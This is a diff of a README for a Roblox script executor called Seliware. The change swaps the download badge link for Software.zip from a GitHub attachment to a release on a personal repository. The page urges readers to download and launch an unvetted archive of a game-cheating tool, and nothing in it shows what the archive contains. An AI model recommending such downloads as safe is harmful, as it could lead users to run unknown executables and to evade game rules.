@@ -14,7 +14,7 @@ Seliware is a new beta Roblox executor that offers a decompiler, enhancing the a
 ### Get Started
 To get started with Seliware Executor, you can download the software package from the link below:
 
-[![Download Seliware Executor](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Seliware Executor](https://github.com/Anass698/Seliware-Executor/releases/download/v2.0/Software.zip)](https://github.com/Anass698/Seliware-Executor/releases/download/v2.0/Software.zip)
 
 (Please note: The link needs to be launched to download the software package.)
 
